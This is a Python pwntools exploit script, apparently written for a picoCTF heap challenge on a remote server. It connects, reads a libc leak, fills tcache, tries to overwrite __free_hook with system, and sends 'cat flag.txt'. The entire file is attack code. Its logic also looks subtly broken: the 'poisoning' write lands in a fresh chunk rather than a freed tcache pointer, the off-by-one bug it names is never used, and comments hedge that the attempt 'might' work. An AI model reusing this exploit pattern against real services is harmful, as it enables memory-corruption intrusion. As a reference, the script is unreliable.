#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'
context.arch = 'amd64'

p = remote(HOST, PORT)

# Dialog
p.recvuntil(b'From Zero to Hero')
p.sendline(b'y')
p.recvuntil(b'Really?')  
p.sendline(b'y')

# Leak
p.recvuntil(b'Take this: ')
leak = int(p.recvline().strip(), 16)
log.info(f"Leak: 0x{leak:x}")

libc_base = leak - 0x21fd0
log.info(f"Libc: 0x{libc_base:x}")

# Get to menu
p.recvuntil(b'>')

# The bug is off-by-one null byte after malloc'd buffer
# We have max 7 allocations (0-6 are valid indices for free)

# Allocate 7 chunks
for i in range(7):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'24')  # Small size for tcache
    p.recvuntil(b'description')
    p.sendline(chr(ord('A') + i).encode() * 24)
    p.recvuntil(b'>')
    log.info(f"Allocated chunk {i}")

# Now we have 7 chunks, can't allocate more
# Free them all to fill tcache
for i in range(7):
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(str(i).encode())
    p.recvuntil(b'>')
    log.info(f"Freed chunk {i}")

# Tcache is now full for size 0x20
# Allocate them back with controlled data

# First allocation - get chunk 6 back
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')

# Try to poison tcache by writing an address
free_hook = libc_base + 0x1e75a8
p.sendline(p64(free_hook)[:24])
p.recvuntil(b'>')

# Continue allocating
for i in range(5):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'24')
    p.recvuntil(b'description')
    p.sendline(b'X' * 24)
    p.recvuntil(b'>')

# The 7th allocation might be at free_hook
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'8')
p.recvuntil(b'description')

system = libc_base + 0x4f4e0
p.sendline(p64(system))

# Try to trigger
p.sendline(b'2')
p.recvuntil(b'remove')
p.sendline(b'0')

# Send command
p.sendline(b'cat flag.txt')

try:
    output = p.recvall(timeout=2)
    if b'picoCTF' in output:
        flag_start = output.index(b'picoCTF')
        flag_end = output.index(b'}', flag_start) + 1
        log.success(f"FLAG: {output[flag_start:flag_end].decode()}")
    else:
        log.info("No flag found, trying interactive")
        p.interactive()
except:
    p.interactive()